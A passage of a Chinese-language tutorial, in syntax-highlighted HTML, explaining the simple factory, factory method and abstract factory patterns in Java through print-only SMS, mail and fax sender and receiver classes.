&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMSSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sendToAll&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;群发短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-简单工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 客户端
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
SenderFactory factory &lt;span style="color:#f92672">=&lt;/span> SenderFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getInstanse&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Sender sd &lt;span style="color:#f92672">=&lt;/span> factory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;sms&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
sd&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>用户/客户端直接与 SenderFactory 交互，SenderFactory 根据参数决定具体创建的产品，用户最终从 SenderFactory 中得到了想要的产品。
可见，通过简单工厂模式，达到了解耦用户与产品的效果。但是，这样的结构并不是完美的。
在本例中，SenderFactory 掌管了所有的业务逻辑处理。这样的类，我们称为上帝类/全能类。上帝类耦合度非常高，每当需要增加新产品时，就需要更改 SenderFactory 中的代码。比如我们想要增加 FaxSender，则 SenderFactory 中的逻辑必然就会产生改动，这不符合设计模式的开闭原则(对扩展开放，对修改关闭)。
所以，当需要频繁增加新产品时，我们就需要通过工厂方法模式来解决问题。&lt;/p>
&lt;h3 id="工厂方法模式">工厂方法模式&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 发送接口.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Sender&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 短信发送类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMSSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认短信发送对象姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 短信发送工厂
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMSSenderFactory&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ISenderFactory &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 邮件发送类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MailSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送邮件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认邮件发送对象姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 邮件发送类制造工厂
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MailSenderFactory&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ISenderFactory &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MailSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 传真发送类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FaxSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送传真&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认传真发送对象姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 传真发送类制造工厂
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FaxSenderFactory&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ISenderFactory &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FaxSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 测试客户端
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 需要生产短信发送器,给客户发送短信
&lt;/span>&lt;span style="color:#75715e">&lt;/span> SMSSenderFactory smsfct &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSSenderFactory&lt;span style="color:#f92672">();&lt;/span>
smsfct&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
smsfct&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 需要生产邮件发送器,给客户发送短信
&lt;/span>&lt;span style="color:#75715e">&lt;/span> MailSenderFactory mailfct &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MailSenderFactory&lt;span style="color:#f92672">();&lt;/span>
mailfct&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 需要生产传真发送器,给客户发送短信
&lt;/span>&lt;span style="color:#75715e">&lt;/span> FaxSenderFactory faxfct &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FaxSenderFactory&lt;span style="color:#f92672">();&lt;/span>
faxfct&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>有别与简单工厂模式。工厂方法模式中工厂类被抽象成为了接口。而不同的产品对应不同的实现了工厂接口的具体工厂。比如 SMSSenderFactory 实现了工厂接口，并且只负责生产 SMSSender 对象产品。当出现新需求，如增加 FaxSender 产品时，我们不需要改动任何代码，只需要创建相应的 FaxSenderFactory 与 FaxSender 就够了。&lt;/p>
&lt;p>细心的读者可能已经发现了，工厂方法模式同样拥有一些“致命”缺点，那就是随着产品的增加，相应的工厂类也会同比增加，造成项目文件十分臃肿巨大。于是，为了减少工厂类的出现数量，抽象工厂模式诞生了。&lt;/p>
&lt;h3 id="抽象工厂模式">抽象工厂模式&lt;/h3>
&lt;p>抽象工厂模式若采用“填鸭式”说明，会让人感觉难以理解。
所以让我们先来尝试靠自己的力量解决一下上一小节中的，工厂方法模式所造成的工厂类大量增多的问题，已达到循序渐进地理解抽象工厂模式的目的。&lt;/p>
&lt;p>工厂类疯狂增多的根本原因，是单个商品的生产对应了单个工厂。
要减少他们的数量，最容易想到的解决方案则是想办法让一个工厂创建多个产品。然而有了第一小节简单工厂模式的知识，我们还知道要尽可能解耦工厂类，避免创建出全能类/上帝类，给将来的维护扩展造成负担。
例如，在项目进行中，突然需要增加一个 Receiver 产品，如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 接收者对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Receiver&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confirmName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 邮件接受对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MailReceiver&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Receiver &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;接受邮件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confirmName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认邮件接受者姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂设计模式
&lt;/span>&lt;span style="color:#75715e"> * 传真接收器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FaxReceiver&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Receiver &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;接受传真&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confirmName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认传真发送方姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂设计模式
&lt;/span>&lt;span style="color:#75715e"> * 短信接受对象
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMSReceiver&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Receiver &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;接受短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confirmName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认短信接受者姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果按照工厂方法设计模式的思路，上面这 3 个 Receiver 需要在项目中增加 3 个对应的具体工厂类。这显然是不太理想的做法。那么，有没有更加理想的做法呢？&lt;/p>
&lt;p>继续分析，本例中 mailSender/mailReceiver，faxSender/faxReceiver，SMSSender/SMSReceiver 刚好能够组合为三对产品组合。如果一个工厂能够生产一对组合产品，是不是只需要三个工厂就能解决我们的需求呢？
在理清了思路后，我们开始动手写代码做一些尝试。
为了方便，我们将 mailSender/mailReceiver 这样一对产品，称为一个产品簇。而 mailSender，faxSender，SMSSender 3 个产品，称为 3 个产品等级。&lt;/p>
&lt;p>&lt;strong>Sender 类产品：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 信息发送产品统一接口
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Sender&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 短信发送对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMSSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认短信发送对象姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 邮件发送类
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MailSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送邮件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
